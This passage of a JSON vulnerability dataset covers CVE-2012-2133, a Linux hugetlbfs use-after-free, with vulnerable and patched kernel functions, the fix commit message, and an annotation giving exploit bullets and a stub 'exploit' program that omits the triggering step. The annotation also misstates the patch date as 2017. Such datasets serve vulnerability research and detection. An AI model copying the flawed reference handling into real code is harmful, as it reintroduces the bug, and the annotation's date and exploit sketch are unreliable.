        "solutions": "static void free_huge_page(struct page *page)\n{\n\t/*\n\t * Can't pass hstate in here because it is called from the\n\t * compound page destructor.\n \t */\n \tstruct hstate *h = page_hstate(page);\n \tint nid = page_to_nid(page);\n\tstruct hugepage_subpool *spool =\n\t\t(struct hugepage_subpool *)page_private(page);\n \n \tset_page_private(page, 0);\n \tpage->mapping = NULL;\n \tBUG_ON(page_count(page));\n\tBUG_ON(page_mapcount(page));\n\tINIT_LIST_HEAD(&page->lru);\n\n\tspin_lock(&hugetlb_lock);\n\tif (h->surplus_huge_pages_node[nid] && huge_page_order(h) < MAX_ORDER) {\n\t\tupdate_and_free_page(h, page);\n\t\th->surplus_huge_pages--;\n\t\th->surplus_huge_pages_node[nid]--;\n\t} else {\n \t\tenqueue_huge_page(h, page);\n \t}\n \tspin_unlock(&hugetlb_lock);\n\thugepage_subpool_put_pages(spool, 1);\n }\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-399",
        "CVE": "CVE-2012-2133",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "mm/hugetlb.c": "int hugetlb_reserve_pages(struct inode *inode,\n\t\t\t\t\tlong from, long to,\n\t\t\t\t\tstruct vm_area_struct *vma,\n\t\t\t\t\tvm_flags_t vm_flags)\n {\n \tlong ret, chg;\n \tstruct hstate *h = hstate_inode(inode);\n \n \t/*\n \t * Only apply hugepage reservation if asked. At fault time, an\n \t * attempt will be made for VM_NORESERVE to allocate a page\n\t * and filesystem quota without using reserves\n \t */\n \tif (vm_flags & VM_NORESERVE)\n \t\treturn 0;\n\n\t/*\n\t * Shared mappings base their reservation on the number of pages that\n\t * are already allocated on behalf of the file. Private mappings need\n\t * to reserve the full area even if read-only as mprotect() may be\n\t * called to make the mapping read-write. Assume !vma is a shm mapping\n\t */\n\tif (!vma || vma->vm_flags & VM_MAYSHARE)\n\t\tchg = region_chg(&inode->i_mapping->private_list, from, to);\n\telse {\n\t\tstruct resv_map *resv_map = resv_map_alloc();\n\t\tif (!resv_map)\n\t\t\treturn -ENOMEM;\n\n\t\tchg = to - from;\n\n\t\tset_vma_resv_map(vma, resv_map);\n\t\tset_vma_resv_flags(vma, HPAGE_RESV_OWNER);\n\t}\n\n \tif (chg < 0)\n \t\treturn chg;\n \n\t/* There must be enough filesystem quota for the mapping */\n\tif (hugetlb_get_quota(inode->i_mapping, chg))\n \t\treturn -ENOSPC;\n \n \t/*\n \t * Check enough hugepages are available for the reservation.\n\t * Hand back the quota if there are not\n \t */\n \tret = hugetlb_acct_memory(h, chg);\n \tif (ret < 0) {\n\t\thugetlb_put_quota(inode->i_mapping, chg);\n \t\treturn ret;\n \t}\n \n\t/*\n\t * Account for the reservations made. Shared mappings record regions\n\t * that have reservations as they are shared by multiple VMAs.\n\t * When the last VMA disappears, the region map says how much\n\t * the reservation was and the page cache tells how much of\n\t * the reservation was consumed. Private mappings are per-VMA and\n\t * only the consumed reservations are tracked. When the VMA\n\t * disappears, the original reservation is the VMA size and the\n\t * consumed reservations are stored in the map. Hence, nothing\n\t * else has to be done for private mappings here\n\t */\n\tif (!vma || vma->vm_flags & VM_MAYSHARE)\n\t\tregion_add(&inode->i_mapping->private_list, from, to);\n\treturn 0;\n}\n"
        },
        "vulnerabilities": "Use-after-free vulnerability in the Linux kernel before 3.3.6, when huge pages are enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges by interacting with a hugetlbfs filesystem, as demonstrated by a umount operation that triggers improper handling of quota data.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2133\n\n[Mandatory] Title: CVE-2012-2133 / CWE-399:\nLinux kernel hugetlbfs use-after-free vulnerability\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-07-03 \u2014 Patch release: 2017-12-28\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.6 with huge pages enabled\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-399: Resource Management Errors\nCVE-2012-2133: Use-after-free in hugetlbfs quota handling\n\n[Mandatory] Summary:\nA use-after-free vulnerability exists in the Linux kernel's hugetlbfs filesystem when huge pages are enabled. Local users can trigger the flaw by interacting with a hugetlbfs filesystem, particularly during umount operations, leading to improper handling of quota data. This can result in denial of service (system crash) or potential privilege escalation.\n\n[Mandatory] Root cause:\nThe vulnerability occurs due to improper lifetime management of quota data structures, where free_huge_page() callbacks can access freed inode/superblock structures.\n\n[Mandatory] Attack Surface:\nLocal users interacting with hugetlbfs filesystem\n\n[Mandatory] Impact Summary:\nLocal denial of service or potential privilege escalation\n\n[Optional] Trigger / Attack vector:\numount operation on hugetlbfs filesystem\n\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nif (hugetlb_get_quota(inode->i_mapping, chg))\n    return -ENOSPC;\n...\nret = hugetlb_acct_memory(h, chg);\nif (ret < 0) {\n    hugetlb_put_quota(inode->i_mapping, chg);\n    return ret;\n}\n```\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nhugetlbfs filesystem operations (umount)\n\n[Mandatory] Exploit primitive(s) available:\nUse-after-free of inode/superblock structures\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled but requires local access and hugetlbfs interaction, with potential for privilege escalation.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Mount hugetlbfs filesystem\n- Allocate huge pages\n- Trigger umount operation while pages are still allocated\n- Exploit race condition to access freed structures\n- Potentially gain elevated privileges\n\n[Mandatory] Exploitation Example script payload code:\n```c\n#include <sys/mount.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n\nint main() {\n    // Mount hugetlbfs\n    mount(\"none\", \"/mnt/huge\", \"hugetlbfs\", 0, NULL);\n    \n    // Allocate huge pages\n    int fd = open(\"/mnt/huge/test\", O_CREAT|O_RDWR, 0755);\n    // ... perform operations with huge pages\n    \n    // Trigger vulnerability\n    umount(\"/mnt/huge\");\n    \n    return 0;\n}\n```\n\nFix\n[Mandatory] Fix code:\n```c\n/* There must be enough pages in the subpool for the mapping */\nif (hugepage_subpool_get_pages(spool, chg))\n    return -ENOSPC;\n...\nret = hugetlb_acct_memory(h, chg);\nif (ret < 0) {\n    hugepage_subpool_put_pages(spool, chg);\n    return ret;\n}\n```\n\n[Mandatory] Fix summary:\nThe fix introduces a subpool concept for hugepage management, removing the direct dependency on inode/superblock structures and preventing the use-after-free condition.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029\n\n[Optional] Patch Analysis:\nField: PatchType - Architectural refactor to remove layering violation\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other filesystem quota implementations\n- Check for similar lifetime management issues in other mm subsystems\n- Audit callback mechanisms in memory management code\n\n[Optional] Likely variants/impact (one line):\nSimilar issues may exist in other filesystem quota implementations.",
        "tests": "NA",
        "solutions": "int hugetlb_reserve_pages(struct inode *inode,\n\t\t\t\t\tlong from, long to,\n\t\t\t\t\tstruct vm_area_struct *vma,\n\t\t\t\t\tvm_flags_t vm_flags)\n {\n \tlong ret, chg;\n \tstruct hstate *h = hstate_inode(inode);\n\tstruct hugepage_subpool *spool = subpool_inode(inode);\n \n \t/*\n \t * Only apply hugepage reservation if asked. At fault time, an\n \t * attempt will be made for VM_NORESERVE to allocate a page\n\t * without using reserves\n \t */\n \tif (vm_flags & VM_NORESERVE)\n \t\treturn 0;\n\n\t/*\n\t * Shared mappings base their reservation on the number of pages that\n\t * are already allocated on behalf of the file. Private mappings need\n\t * to reserve the full area even if read-only as mprotect() may be\n\t * called to make the mapping read-write. Assume !vma is a shm mapping\n\t */\n\tif (!vma || vma->vm_flags & VM_MAYSHARE)\n\t\tchg = region_chg(&inode->i_mapping->private_list, from, to);\n\telse {\n\t\tstruct resv_map *resv_map = resv_map_alloc();\n\t\tif (!resv_map)\n\t\t\treturn -ENOMEM;\n\n\t\tchg = to - from;\n\n\t\tset_vma_resv_map(vma, resv_map);\n\t\tset_vma_resv_flags(vma, HPAGE_RESV_OWNER);\n\t}\n\n \tif (chg < 0)\n \t\treturn chg;\n \n\t/* There must be enough pages in the subpool for the mapping */\n\tif (hugepage_subpool_get_pages(spool, chg))\n \t\treturn -ENOSPC;\n \n \t/*\n \t * Check enough hugepages are available for the reservation.\n\t * Hand the pages back to the subpool if there are not\n \t */\n \tret = hugetlb_acct_memory(h, chg);\n \tif (ret < 0) {\n\t\thugepage_subpool_put_pages(spool, chg);\n \t\treturn ret;\n \t}\n \n\t/*\n\t * Account for the reservations made. Shared mappings record regions\n\t * that have reservations as they are shared by multiple VMAs.\n\t * When the last VMA disappears, the region map says how much\n\t * the reservation was and the page cache tells how much of\n\t * the reservation was consumed. Private mappings are per-VMA and\n\t * only the consumed reservations are tracked. When the VMA\n\t * disappears, the original reservation is the VMA size and the\n\t * consumed reservations are stored in the map. Hence, nothing\n\t * else has to be done for private mappings here\n\t */\n\tif (!vma || vma->vm_flags & VM_MAYSHARE)\n\t\tregion_add(&inode->i_mapping->private_list, from, to);\n\treturn 0;\n}\n",
        "Publish Date": "2012-07-03",
        "Update Date": "2017-12-28",
        "Vulnerability type": "DoS +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/90481622d75715bfcb68501280a917dbfe516029",
        "commit_id": "90481622d75715bfcb68501280a917dbfe516029",
        "commit_message": "hugepages: fix use after free bug in \"quota\" handling\n\nhugetlbfs_{get,put}_quota() are badly named.  They don't interact with the\ngeneral quota handling code, and they don't much resemble its behaviour.\nRather than being about maintaining limits on on-disk block usage by\nparticular users, they are instead about maintaining limits on in-memory\npage usage (including anonymous MAP_PRIVATE copied-on-write pages)\nassociated with a particular hugetlbfs filesystem instance.\n\nWorse, they work by having callbacks to the hugetlbfs filesystem code from\nthe low-level page handling code, in particular from free_huge_page().\nThis is a layering violation of itself, but more importantly, if the\nkernel does a get_user_pages() on hugepages (which can happen from KVM\namongst others), then the free_huge_page() can be delayed until after the\nassociated inode has already been freed.  If an unmount occurs at the\nwrong time, even the hugetlbfs superblock where the \"quota\" limits are\nstored may have been freed.\n\nAndrew Barry proposed a patch to fix this by having hugepages, instead of\nstoring a pointer to their address_space and reaching the superblock from\nthere, had the hugepages store pointers directly to the superblock,\nbumping the reference count as appropriate to avoid it being freed.\nAndrew Morton rejected that version, however, on the grounds that it made\nthe existing layering violation worse.\n\nThis is a reworked version of Andrew's patch, which removes the extra, and\nsome of the existing, layering violation.  It works by introducing the\nconcept of a hugepage \"subpool\" at the lower hugepage mm layer - that is a\nfinite logical pool of hugepages to allocate from.  hugetlbfs now creates\na subpool for each filesystem instance with a page limit set, and a\npointer to the subpool gets added to each allocated hugepage, instead of\nthe address_space pointer used now.  The subpool has its own lifetime and\nis only freed once all pages in it _and_ all other references to it (i.e.\nsuperblocks) are gone.\n\nsubpools are optional - a NULL subpool pointer is taken by the code to\nmean that no subpool limits are in effect.\n\nPrevious discussion of this bug found in:  \"Fix refcounting in hugetlbfs\nquota handling.\". See:  https://lkml.org/lkml/2011/8/11/28 or\nhttp://marc.info/?l=linux-mm&m=126928970510627&w=1\n\nv2: Fixed a bug spotted by Hillf Danton, and removed the extra parameter to\nalloc_huge_page() - since it already takes the vma, it is not necessary.\n\nSigned-off-by: Andrew Barry <abarry@cray.com>\nSigned-off-by: David Gibson <david@gibson.dropbear.id.au>\nCc: Hugh Dickins <hughd@google.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Minchan Kim <minchan.kim@gmail.com>\nCc: Hillf Danton <dhillf@gmail.com>\nCc: Paul Mackerras <paulus@samba.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    }
]